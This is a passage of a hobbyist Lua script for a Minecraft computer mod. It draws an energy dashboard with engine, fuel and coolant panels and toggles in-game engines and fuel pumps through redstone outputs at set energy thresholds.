local onThreshold = 9298000 -- Energy threshold to turn the engine on



-- Function to enable a specific bank of bundled wire outputs connected to engines
local function enableWireBank(bank)
    component.redstone.setBundledOutput(3, bank, 255)
end

-- Function to disable a specific bank of bundled wire outputs connected to engines
local function disableWireBank(bank)
    component.redstone.setBundledOutput(3, bank, 0)
end

-- Function to enable a specific bank of bundled wire outputs connected to fuel tank
local function enableFuelPump(bank)
    component.redstone.setBundledOutput(1, bank, 255)
end

-- Function to disable a specific bank of bundled wire outputs connected to engines
local function disableFuelPump(bank)
    component.redstone.setBundledOutput(1, bank, 0)
end


-- Progress bar object
local progressBar = {
    x = 25,
    y = 6,
    width = 120,
    height = 10,
    progress = 0,
    maxProgress = 100,
    backgroundColor = 0x808080,
    filledColor = 0x00BFFF,
    shadowColor = 0x404040,
    highlightColor = 0xFFFFFF,
    orientation = ""horizontal"" -- Default orientation is horizontal
}

function progressBar:load(x, y, width, height, maxProgress)
    self.x = x or self.x
    self.y = y or self.y
    self.width = width or self.width
    self.height = height or self.height
    self.maxProgress = maxProgress or self.maxProgress
    self.orientation = orientation or self.orientation
end



-- Progress bar draw
function progressBar:draw()
    local filledWidth = math.floor((self.progress / self.maxProgress) * self.width)

    -- Set color for filled part
    gpu.setBackground(0x00BFFF)
    gpu.fill(self.x, self.y, filledWidth, self.height, ' ')
    
    -- Set color for unfilled part
    gpu.setBackground(0x808080)
    gpu.fill(self.x + filledWidth, self.y, self.width - filledWidth, self.height, ' ')

    -- Draw threshold line
    local offThresholdX = math.floor((offThreshold / self.maxProgress) * self.width) + self.x+1
    local onThresholdX = math.floor((onThreshold / self.maxProgress) * self.width) + self.x+1
    gpu.setBackground(0xFF0000) -- Red color for off threshold
    gpu.fill(offThresholdX, self.y , 1, self.height, ' ')
    gpu.setBackground(0x00FF00) -- Green color for on threshold
    gpu.fill(onThresholdX, self.y, 1, self.height, ' ')
    
    -- Reset color to white
    gpu.setBackground(0xFFFFFF)
end

-- Progress bar update
function progressBar:update(progress)
    self.progress = progress
    progressBar:draw()

end


-- Fluid tank object
local fluidTank = {
    x = 120,
    y = 5,
    width = 15,
    height = 8,
    tankCapacity = 0,
    fluidAmount = 0,
    fluidName = """",
}

-- Fluid tank load
function fluidTank:load()
    self.tankCapacity = tankController.getTankCapacity(1)
    local fluidInTank = tankController.getFluidInTank(1)
    if fluidInTank[1] then
        self.fluidAmount = fluidInTank[1].amount
        self.fluidName = fluidInTank[1].name
    else
        self.fluidAmount = 0
        self.fluidName = ""Empty""
    end
end


-- Fluid tank update
function fluidTank:update()
    self.fluidAmount = tankController.getTankLevel(1)
    local fluidInTank = tankController.getFluidInTank(1)
    if fluidInTank[1] then
        self.fluidName = fluidInTank[1].name
    else
        self.fluidName = ""Empty""
    end
end

-- Fluid tank draw
function fluidTank:draw()
    -- Calculate fluid level height
    local fluidLevelHeight = math.floor((self.fluidAmount / self.tankCapacity) * (self.height - 2))
    if fluidLevelHeight > self.height - 2 then
        fluidLevelHeight = self.height - 2
    end
    -- Draw fluid tank background
    gpu.setBackground(0x808080)
    gpu.fill(self.x, self.y, self.width, self.height, ' ')
    
    -- Draw fluid level if tank is not empty
    if self.fluidAmount > 1 then
        gpu.setBackground(0xFFFF00)
        gpu.fill(self.x + 1, self.y + self.height - fluidLevelHeight - 1, self.width - 2, fluidLevelHeight, ' ')
        gpu.setBackground(0x000000)
        
    end
    
    -- Draw unfilled part of the tank
    gpu.setBackground(0x000000)
    gpu.fill(self.x + 1, self.y + 1, self.width - 2, self.height - fluidLevelHeight - 2, ' ')
    
    -- Draw fluid name and amount
    
    gpu.setForeground(0xFFFFFF)
    gpu.set(self.x-2, self.y - 1, ""Fluid: "" .. self.fluidName)
    gpu.set(self.x, self.y + self.height, ""Amount: "" .. self.fluidAmount .. "" mB"")
end

--================
--  PART 1  END
--================

--================
--  PART 2  START
--================





-- Engine object
local engine = {
    
    body = {x = 105, y = 19, width = 1, height = 3, color = 0xFFFFFF},
    head = {x = 105+1, y = 19, width = 1, height = 3, color = 0xC0C0C0}, -- Silver (0xC0C0C0) or White (0xFFFFFF)
    core = {x = 105+1, y = 19+1, width = 4, height = 1, color = 0x8B4513},
   }

-- Engine load
function engine:load()
    self.core.x = engine.core.x
    self.core.y = engine.core.y
    self.body.x = engine.body.x
    self.body.y = engine.body.y
    self.head.x = engine.head.x
    self.head.y = engine.head.y
end

function resetCycle()
    totalDischarge = 0
    totalCharge = 0
    dischargeCount = 0
    chargeCount = 0
end


-- Engine update
function engine:update()
    if self.movement == nil then
        self.movement = 0
        self.direction = true
    end
    
    if self.direction then
        self.head.x = self.head.x + 1
    else
        self.head.x = self.head.x - 1
    end
    
    self.movement = self.movement + 1
    
    if self.movement >= 3 then
        self.movement = 0
        self.direction = not self.direction
        resetCycle() -- Reset the cycle when the engine completes a cycle
    end

    --draw engine background
    gpu.setBackground(0x000000)
    gpu.fill(self.core.x, self.core.y-1, self.core.width, self.core.height+2, ' ')
    -- Draw core
    gpu.setBackground(self.core.color)
    gpu.fill(self.core.x, self.core.y, self.core.width, self.core.height, ' ')
    -- Draw head
    gpu.setBackground(self.head.color)
    gpu.fill(self.head.x, self.head.y, self.head.width, self.head.height, ' ')  
end

--================
--  PART 2  END
--================


--================
--  PART 3  START
--================


-- Engine draw
function engine:draw()

    gpu.setBackground(0x000000)
    gpu.fill(self.core.x, self.core.y-1, self.core.width, self.core.height+2, ' ')

    -- Draw core
    gpu.setBackground(self.core.color)
    gpu.fill(self.core.x, self.core.y, self.core.width, self.core.height, ' ')
    -- Draw body
    gpu.setBackground(self.body.color)
    gpu.fill(self.body.x, self.body.y, self.body.width, self.body.height, ' ')
    -- Draw head
    gpu.setBackground(self.head.color)
    gpu.fill(self.head.x, self.head.y, self.head.width, self.head.height, ' ')  
    -- Reset color to white
    gpu.setBackground(0xFFFFFF)
end


function loadEnginPanel()
    engine_1_bank_1_temp = component.proxy(engine_1_bank_1).getFluidInTank(1)
    engine_1_bank_1_fuel = engine_1_bank_1_temp[1]
    engine_1_bank_1_coolant = engine_1_bank_1_temp[2]
    engine_2_bank_1_temp = component.proxy(engine_2_bank_1).getFluidInTank(1)
    engine_2_bank_1_fuel = engine_2_bank_1_temp[1]
    engine_2_bank_1_coolant = engine_2_bank_1_temp[2]
    engine_3_bank_1_temp = component.proxy(engine_3_bank_1).getFluidInTank(1)
    engine_3_bank_1_fuel = engine_3_bank_1_temp[1]
    engine_3_bank_1_coolant = engine_3_bank_1_temp[2]
    engine_4_bank_1_temp = component.proxy(engine_4_bank_1).getFluidInTank(1)
    engine_4_bank_1_fuel =  engine_4_bank_1_temp[1]
    engine_4_bank_1_coolant =  engine_4_bank_1_temp[2]
  

    engine_1_bank_2_temp = component.proxy(engine_1_bank_2).getFluidInTank(1)
    engine_1_bank_2_fuel = engine_1_bank_2_temp[1]
    engine_1_bank_2_coolant = engine_1_bank_2_temp[2]
    engine_2_bank_2_temp = component.proxy(engine_2_bank_2).getFluidInTank(1)
    engine_2_bank_2_fuel = engine_2_bank_2_temp[1]
    engine_2_bank_2_coolant = engine_2_bank_2_temp[2]
    engine_3_bank_2_temp = component.proxy(engine_3_bank_2).getFluidInTank(1)
    engine_3_bank_2_fuel = engine_3_bank_2_temp[1]
    engine_3_bank_2_coolant = engine_3_bank_2_temp[2]
    engine_4_bank_2_temp = component.proxy(engine_4_bank_2).getFluidInTank(1)
    engine_4_bank_2_fuel =  engine_4_bank_2_temp[1]
    engine_4_bank_2_coolant =  engine_4_bank_2_temp[2]


    
end

function drawEnginePanel()
    gpu.setBackground(infoPanel.color)
    gpu.fill(infoPanel.x, infoPanel.y, infoPanel.width, infoPanel.height, ' ')
    gpu.setForeground(0x228B22)
    
    --FFA500
    term.setCursor(infoPanel.x+(infoPanel.width/2)-string.len(""engine bank 1"")/2, infoPanel.y)
    term.write(""engine bank 1"")


    gpu.setForeground(0xCCCC00) 
    term.setCursor(infoPanel.x+1, infoPanel.y+1)
    term.write(""engine 1 fuel type:""..engine_1_bank_1_fuel.name)
    
    gpu.setForeground(0x000000)
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 fuel:"") + 5) / 2, infoPanel.y + 2)
    term.write(""engine 1 fuel:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 fuel:"") + 5) / 2 + (string.len(""engine 1 fuel:"")), infoPanel.y + 2)
    term.write(engine_1_bank_1_fuel.amount)

    
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 coolant:"") + 5) / 2, infoPanel.y + 3)
    term.write(""engine 1 coolant:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 coolant:"") + 5) / 2 + (string.len(""engine 1 coolant:"")), infoPanel.y + 3)
    term.write(engine_1_bank_1_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 fuel:"") + 5) / 2, infoPanel.y + 4)
    term.write(""engine 2 fuel:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 fuel:"") + 5) / 2 + (string.len(""engine 2 fuel:"")), infoPanel.y + 4)
    term.write(engine_2_bank_1_fuel.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 coolant:"") + 5) / 2, infoPanel.y + 5)
    term.write(""engine 2 coolant:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 coolant:"") + 5) / 2 + (string.len(""engine 2 coolant:"")), infoPanel.y + 5)
    term.write(engine_2_bank_1_coolant.amount)
 
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 fuel:"") + 5) / 2, infoPanel.y + 6)
    term.write(""engine 3 fuel:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 fuel:"") + 5) / 2 + (string.len(""engine 3 fuel:"")), infoPanel.y + 6)
    term.write(engine_3_bank_1_fuel.amount)
 
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 coolant:"") + 5) / 2, infoPanel.y + 7)
    term.write(""engine 3 coolant:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 coolant:"") + 5) / 2 + (string.len(""engine 3 coolant:"")), infoPanel.y + 7)
    term.write(engine_3_bank_1_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 fuel:"") + 5) / 2, infoPanel.y + 8)
    term.write(""engine 4 fuel:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 fuel:"") + 5) / 2 + (string.len(""engine 4 fuel:"")), infoPanel.y + 8)
    term.write(engine_4_bank_1_fuel.amount)

    
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 coolant:"") + 5) / 2, infoPanel.y + 9)
    term.write(""engine 4 coolant:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 coolant:"") + 5) / 2 + (string.len(""engine 4 coolant:"")), infoPanel.y + 9)
    term.write(engine_4_bank_1_coolant.amount)

    gpu.setBackground(infoPanel.color)
    gpu.fill(infoPanel.x, infoPanel.y+infoPanel.height+1, infoPanel.width, infoPanel.height, ' ')

    gpu.setForeground(0x228B22)
    term.setCursor(infoPanel.x+(infoPanel.width/2)-string.len(""engine bank 2"")/2, infoPanel.y+infoPanel.height+1)
    term.write(""engine bank 2"")

    gpu.setForeground(0xCCCC00) 
    term.setCursor(infoPanel.x+1, infoPanel.y+1+infoPanel.height+1)
    term.write(""engine 1 fuel type:""..engine_1_bank_2_fuel.name)

    gpu.setForeground(0x000000)
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 fuel:"") + 5) / 2, infoPanel.y + 2+infoPanel.height+1)
    term.write(""engine 1 fuel:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 fuel:"") + 5) / 2 + (string.len(""engine 1 fuel:"")), infoPanel.y + 2)
    term.write(engine_1_bank_2_fuel.amount)
    
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 coolant:"") + 5) / 2, infoPanel.y + 3+infoPanel.height+1)
    term.write(""engine 1 coolant:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 coolant:"") + 5) / 2 + (string.len(""engine 1 coolant:"")), infoPanel.y + 3)
    term.write(engine_1_bank_2_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 fuel:"") + 5) / 2, infoPanel.y + 4+infoPanel.height+1)
    term.write(""engine 2 fuel:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 fuel:"") + 5) / 2 + (string.len(""engine 2 fuel:"")), infoPanel.y + 4)
    term.write(engine_2_bank_2_fuel.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 coolant:"") + 5) / 2, infoPanel.y + 5+infoPanel.height+1)
    term.write(""engine 2 coolant:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 coolant:"") + 5) / 2 + (string.len(""engine 2 coolant:"")), infoPanel.y + 5)
    term.write(engine_2_bank_2_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 fuel:"") + 5) / 2, infoPanel.y + 6+infoPanel.height+1)
    term.write(""engine 3 fuel:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 fuel:"") + 5) / 2 + (string.len(""engine 3 fuel:"")), infoPanel.y + 6)
    term.write(engine_3_bank_2_fuel.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 coolant:"") + 5) / 2, infoPanel.y + 7+infoPanel.height+1)
    term.write(""engine 3 coolant:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 coolant:"") + 5) / 2 + (string.len(""engine 3 coolant:"")), infoPanel.y + 7)
    term.write(engine_3_bank_2_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 fuel:"") + 5) / 2, infoPanel.y + 8+infoPanel.height+1)
    term.write(""engine 4 fuel:"")
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 fuel:"") + 5) / 2 + (string.len(""engine 4 fuel:"")), infoPanel.y + 8)
    term.write(engine_4_bank_2_fuel.amount)
    
    
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 coolant:"") + 5) / 2, infoPanel.y + 9+infoPanel.height+1)
    term.write(""engine 4 coolant:"")

    
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 coolant:"") + 5) / 2 + (string.len(""engine 4 coolant:"")), infoPanel.y + 9)
    term.write(engine_4_bank_2_coolant.amount)


end

function updateEnginePanel()
    engine_1_bank_1_temp = component.proxy(engine_1_bank_1).getFluidInTank(1)
    engine_1_bank_1_fuel = engine_1_bank_1_temp[1]
    engine_1_bank_1_coolant = engine_1_bank_1_temp[2]
    engine_2_bank_1_temp = component.proxy(engine_2_bank_1).getFluidInTank(1)
    engine_2_bank_1_fuel = engine_2_bank_1_temp[1]
    engine_2_bank_1_coolant = engine_2_bank_1_temp[2]
    engine_3_bank_1_temp = component.proxy(engine_3_bank_1).getFluidInTank(1)
    engine_3_bank_1_fuel = engine_3_bank_1_temp[1]
    engine_3_bank_1_coolant = engine_3_bank_1_temp[2]
    engine_4_bank_1_temp = component.proxy(engine_4_bank_1).getFluidInTank(1)
    engine_4_bank_1_fuel =  engine_4_bank_1_temp[1]
    engine_4_bank_1_coolant =  engine_4_bank_1_temp[2]


    engine_1_bank_2_temp = component.proxy(engine_1_bank_2).getFluidInTank(1)
    engine_1_bank_2_fuel = engine_1_bank_2_temp[1]
    engine_1_bank_2_coolant = engine_1_bank_2_temp[2]
    engine_2_bank_2_temp = component.proxy(engine_2_bank_2).getFluidInTank(1)
    engine_2_bank_2_fuel = engine_2_bank_2_temp[1]
    engine_2_bank_2_coolant = engine_2_bank_2_temp[2]
    engine_3_bank_2_temp = component.proxy(engine_3_bank_2).getFluidInTank(1)
    engine_3_bank_2_fuel = engine_3_bank_2_temp[1]
    engine_3_bank_2_coolant = engine_3_bank_2_temp[2]
    engine_4_bank_2_temp = component.proxy(engine_4_bank_2).getFluidInTank(1)
    engine_4_bank_2_fuel =  engine_4_bank_2_temp[1]
    engine_4_bank_2_coolant =  engine_4_bank_2_temp[2]

    gpu.setBackground(infoPanel.color)
    
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 fuel:"") + 5) / 2 + (string.len(""engine 1 fuel:"")), infoPanel.y + 2)
    gpu.setForeground(0xCCCC00)
    term.write(engine_1_bank_1_fuel.amount)
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 coolant:"") + 5) / 2 + (string.len(""engine 1 coolant:"")), infoPanel.y + 3)
    gpu.setForeground(0x000080)
    term.write(engine_1_bank_1_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 fuel:"") + 5) / 2 + (string.len(""engine 2 fuel:"")), infoPanel.y + 4)
    gpu.setForeground(0xCCCC00)
    term.write(engine_2_bank_1_fuel.amount)
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 coolant:"") + 5) / 2 + (string.len(""engine 2 coolant:"")), infoPanel.y + 5)
    gpu.setForeground(0x000080)
    term.write(engine_2_bank_1_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 fuel:"") + 5) / 2 + (string.len(""engine 3 fuel:"")), infoPanel.y + 6)
    gpu.setForeground(0xCCCC00)
    term.write(engine_3_bank_1_fuel.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 coolant:"") + 5) / 2 + (string.len(""engine 3 coolant:"")), infoPanel.y + 7)
    gpu.setForeground(0x000080)
    term.write(engine_3_bank_1_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 fuel:"") + 5) / 2 + (string.len(""engine 4 fuel:"")), infoPanel.y + 8)
    gpu.setForeground(0xCCCC00)
    term.write(engine_4_bank_1_fuel.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 coolant:"") + 5) / 2 + (string.len(""engine 4 coolant:"")), infoPanel.y + 9)
    gpu.setForeground(0x000080)
    term.write(engine_4_bank_1_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 fuel:"") + 5) / 2 + (string.len(""engine 1 fuel:"")), infoPanel.y + 17)
    gpu.setForeground(0xCCCC00)
    term.write(engine_1_bank_2_fuel.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 1 coolant:"") + 5) / 2 + (string.len(""engine 1 coolant:"")), infoPanel.y + 18)
    gpu.setForeground(0x000080)
    term.write(engine_1_bank_2_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 fuel:"") + 5) / 2 + (string.len(""engine 2 fuel:"")), infoPanel.y + 19)
    gpu.setForeground(0xCCCC00)
    term.write(engine_2_bank_2_fuel.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 2 fuel:"") + 5) / 2 + (string.len(""engine 2 fuel:"")), infoPanel.y + 20)
    gpu.setForeground(0x000080)
    term.write(engine_2_bank_2_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 fuel:"") + 5) / 2 + (string.len(""engine 3 fuel:"")), infoPanel.y + 21)
    gpu.setForeground(0xCCCC00)
    term.write(engine_3_bank_2_fuel.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 3 coolant:"") + 5) / 2 + (string.len(""engine 3 coolant:"")), infoPanel.y + 22)
    gpu.setForeground(0x000080)
    term.write(engine_3_bank_2_coolant.amount)

    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 fuel:"") + 5) / 2 + (string.len(""engine 4 fuel:"")), infoPanel.y + 23)
    gpu.setForeground(0xCCCC00)
    term.write(engine_4_bank_2_fuel.amount)
    
    term.setCursor(infoPanel.x + infoPanel.width / 2 - (string.len(""engine 4 coolant:"") + 5) / 2 + (string.len(""engine 4 coolant:"")), infoPanel.y + 24)
    gpu.setForeground(0x000080)
    term.write(engine_4_bank_2_coolant.amount)

    if engine_4_bank_2_fuel.amount <=1000 or engine_4_bank_1_fuel.amount <=1000 then
        enableFuelPump(4)
        enableFuelPump(5)
    elseif engine_4_bank_2_fuel.amount >=9900 or engine_4_bank_1_fuel.amount >=9900 then
        disableFuelPump(4)
        disableFuelPump(5)
    end


end


function loadEnergyPanel()
    
    totalCharge = 0
    dischargeCount = 0
    chargeCount = 0
    totalDischarge = 0
    energySamples = {} -- Table to store energy samples
    sampleRate = 10 -- Number of ticks between energy samples
    maxSamples = 10 -- Maximum number of energy samples to keep
    dischargeRate = 0 -- Energy discharge rate
    chargeRate = 0 -- Energy charge rate
    sampleSize = 10 -- Number of samples to use when calculating average rates
    chargeRateSamples = {} -- Table to store charge rate samples
    dischargeRateSamples = {} -- Table to store discharge rate samples
    infoPanel = {x = 115, y = 19, width = 33, height = 14, color = 0x229B22}

    boxX = progressBar.x
    boxY = progressBar.y + progressBar.height + 1
    boxWidth = 60
    boxHeight = 6
    averageDischarge = totalDischarge / (dischargeCount > 0 and dischargeCount or 1)
    averageCharge = totalCharge / (chargeCount > 0 and chargeCount or 1)

   
    --
end



function updateEnergyPanel()


        -- Calculate discharge and charge rates
        local currentTick = computer.uptime()
        local lastSample = energySamples[#energySamples]
        if lastSample then
            local deltaTime = currentTick - lastSample.tick
            local deltaEnergy = energy - lastSample.energy
    
            if deltaTime > 0 then
                if deltaEnergy > 0 then
                    chargeRate = deltaEnergy / deltaTime
                    dischargeRate = 0
                elseif deltaEnergy < 0 then
                    dischargeRate = -deltaEnergy / deltaTime
                    chargeRate = 0
                end
            end
            if deltaEnergy > 0 then
                chargeRate = deltaEnergy / deltaTime
                totalCharge = totalCharge + chargeRate
                chargeCount = chargeCount + 1
                dischargeRate = 0
            elseif deltaEnergy < 0 then
                dischargeRate = -deltaEnergy / deltaTime
                totalDischarge = totalDischarge + dischargeRate
                dischargeCount = dischargeCount + 1
                chargeRate = 0
            end
        end
    
        -- Store energy sample
        table.insert(energySamples, 1, { tick = currentTick, energy = energy })
        if #energySamples > maxSamples then
            table.remove(energySamples)
        end
    
    if shouldAnimate then
        gpu.setBackground(0x000000)
        gpu.setForeground(0x00FF00)
        gpu.fill(progressBar.x+progressBar.width/2-string.len(""Current Energy: "")+8/2+string.len(""Current Energy: ""), progressBar.y + progressBar.height + 1, 9, 1, ' ')
        gpu.set(progressBar.x+progressBar.width/2-string.len(""Current Energy: "")+8/2+string.len(""Current Energy: ""), progressBar.y + progressBar.height + 1, tostring(energy))
    else
        gpu.setBackground(0x000000)
        gpu.setForeground(0xFF0000)
        gpu.fill(progressBar.x+progressBar.width/2-string.len(""Current Energy: "")+8/2+string.len(""Current Energy: ""), progressBar.y + progressBar.height + 1, 9, 1, ' ')
        gpu.set(progressBar.x+progressBar.width/2-string.len(""Current Energy: "")+8/2+string.len(""Current Energy: ""), progressBar.y + progressBar.height + 1, tostring(energy))
    end

    -- Render discharge rate
    local dischargeText = string.format(""Discharge Rate:%.2f RF/t"", dischargeRate)
    gpu.setBackground(0x808080)
    gpu.setForeground(0xFF0000)
    gpu.fill(boxX + 2+string.len(dischargeText)-string.len(dischargeRate), boxY + 1, string.len(dischargeRate)+5, 1, "" "")
    gpu.set(boxX + 2, boxY + 1, dischargeText)

    -- Render charge rate
    local chargeText = string.format(""Charge Rate:%.2f RF/t"", chargeRate)
    gpu.setBackground(0x808080)
    gpu.setForeground(0x00FF00)
    gpu.fill(boxX + 2+string.len(chargeText)-string.len(chargeRate), boxY + 2, string.len(chargeRate)+5, 1, "" "")
    gpu.set(boxX + 2, boxY + 2, chargeText)


    local averageDischargeText = string.format(""Average Discharge Rate:%.2f RF/t"", averageDischarge)
    gpu.setBackground(0x808080)
    gpu.setForeground(0xFF0000)
    gpu.fill(boxX + 2+string.len(averageDischargeText)-string.len(averageDischarge), boxY + 3, string.len(averageDischarge)+5, 1, "" "")
    gpu.set(boxX + 2, boxY + 3, averageDischargeText)
    
    local averageChargeText = string.format(""Average Charge Rate:%.2f RF/t"", averageCharge)
    gpu.setBackground(0x808080)
    gpu.setForeground(0x00FF00)
    gpu.fill(boxX + 2+string.len(averageChargeText)-string.len(averageCharge), boxY + 4, string.len(averageCharge)+5, 1, "" "")
    gpu.set(boxX + 2, boxY + 4, averageChargeText)



    -- Update energy and progress bar
    energy = energyCube.getEnergyStored()
    progressBar:update(energy)


    

end

function drawEnergyPanel()
    -- Render discharge and charge rates

    
    gpu.setBackground(0x000000)
    gpu.setForeground(0xFFFFFF)
    gpu.fill(1, 1, 160, 50, ' ')
    
    gpu.setBackground(0x000000)
    gpu.setForeground(0xFFFFFF)
    gpu.set(progressBar.x+progressBar.width/2-string.len(""Current Energy: "")+8/2, progressBar.y + progressBar.height + 1, ""Current Energy: "" .. tostring(energy))
    gpu.set(progressBar.x+progressBar.width/2-string.len(""Max Energy: "")+8/2, progressBar.y + progressBar.height + 2, ""Max Energy: "" .. tostring(maxEnergy))
        -- Draw gray box
        gpu.setBackground(0x808080)
        gpu.fill(boxX, boxY, boxWidth, boxHeight, ' ')
        local averageDischargeText = string.format(""Average Discharge Rate:%.2f RF/t"", averageDischarge)
        gpu.setBackground(0x808080)
        gpu.setForeground(0xFFFFFF)
        gpu.set(boxX + 2, boxY + 3, averageDischargeText)
        
        local averageChargeText = string.format(""Average Charge Rate: %.2f RF/t"", averageCharge)
        gpu.setBackground(0x808080)
        gpu.setForeground(0xFFFFFF)
        gpu.set(boxX + 2, boxY + 4, averageChargeText)
    
    
        -- Render discharge rate
        local dischargeText = string.format(""Discharge Rate: %.2f RF/t"", dischargeRate)
        gpu.setBackground(0x808080)
        gpu.setForeground(0xFFFFFF)
        gpu.set(boxX + 2, boxY + 1, dischargeText)
    
        -- Render charge rate
        local chargeText = string.format(""Charge Rate: %.2f RF/t"", chargeRate)
        gpu.setBackground(0x808080)
        gpu.setForeground(0xFFFFFF)
        gpu.set(boxX + 2, boxY + 2, chargeText)
        local averageDischargeText = string.format(""Average Discharge Rate: %.2f RF/t"", averageDischarge)
        gpu.setBackground(0x808080)
        gpu.setForeground(0xFFFFFF)
        gpu.set(boxX + 2, boxY + 3, averageDischargeText)
        
        local averageChargeText = string.format(""Average Charge Rate: %.2f RF/t"", averageCharge)
        gpu.setBackground(0x808080)
        gpu.setForeground(0xFFFFFF)
        gpu.set(boxX + 2, boxY + 4, averageChargeText)
    
end


--================
--  PART 3  END
--================

--================
--  PART 4 START
--================


--[[
local graph = {
    x = progressBar.x,
    y = progressBar.y + progressBar.height + 10,
    width = progressBar.width,
    height = 10,
    data = {},
    maxDataPoints = 100,
}

-- Graph add data
function graph:addData(value)
    table.insert(self.data, 1, value)
    if #self.data > self.maxDataPoints then
        table.remove(self.data)
    end
end

-- Graph draw
function graph:draw()
    -- Draw graph background
    gpu.setBackground(0x808080)
    gpu.fill(self.x, self.y, self.width, self.height, ' ')

    -- Calculate scale and offset for mapping data to graph coordinates
    local minData = math.min(table.unpack(self.data))
    local maxData = math.max(table.unpack(self.data))
    local scale = (maxData - minData) / self.height
    local xOffset = self.width / (#self.data - 1)

    -- Draw data points
    gpu.setBackground(0x00BFFF)
    for i = 2, #self.data do
        local x1 = self.x + (i - 2) * xOffset
        local x2 = self.x + (i - 1) * xOffset
        local y1 = self.y + self.height - math.floor((self.data[i - 1] - minData) / scale)
        local y2 = self.y + self.height - math.floor((self.data[i] - minData) / scale)
        gpu.fill(x1, y1, 1, 1, ' ')
        gpu.fill(x2, y2, 1, 1, ' ')
        gpu.fill(x1, y1, math.abs(x2 - x1) + 1, math.abs(y2 - y1) + 1, ' ')
    end

    -- Reset color to white
    gpu.setBackground(0xFFFFFF)
end

--]]



--[[
    ╔════════════════════════════╗
    ║ MAIN PROGRAM INITIALIZATION║
    ╚════════════════════════════╝
--]]
function load()
    maxEnergy = energyCube.getMaxEnergyStored()
    gpu.setResolution(160, 50) -- Set screen resolution
    progressBar:load(2, 2, 158, 15, maxEnergy) -- Initialize progress bar
    loadEnergyPanel()
    engine:load() -- Initialize engine
    loadEnginPanel()
    --fluidTank:load()
end

--================
--  PART 4 END
--================

--================
--  PART 5 START
--================


--[[
    ╔═══════════════════════╗
    ║ MAIN PROGRAM LOOP     ║
    ╚═══════════════════════╝
--]]


function update()
    -- Check bundled inputs
    local orangeInput = component.redstone.getBundledInput(3, 1) or 0
    local whiteInput = component.redstone.getBundledInput(3, 0) or 0

    -- Check if animation should run
     shouldAnimate = orangeInput > 1 or whiteInput > 1

    
    
    if shouldAnimate then
        engine:update()
    end

    -- Check thresholds and set bundled wire outputs
    if energy <= onThreshold then
        -- Set bundled wire outputs to white (bit 0) and orange (bit 1)
        enableWireBank(0)
        enableWireBank(1) -- Disable orange wire output
    elseif energy >= offThreshold  then
        -- Set bundled wire outputs to white (bit 0) and orange (bit 1)
        disableWireBank(0) -- Disable orange wire output
        disableWireBank(1) -- Disable white wire output
    
    end
    --fluidTank:update()
    updateEnergyPanel()
    updateEnginePanel()
    --engine:draw()

end

--================
--  PART 5 END
--================


--================
--FINAL PART START
--================




function draw()
    -- Clear screen
 
    drawEnergyPanel()
    engine:draw()
    drawEnginePanel()
    progressBar:draw()
    
    -- Reset color to white
    gpu.setBackground(0xFFFFFF)
    --fluidTank:draw()
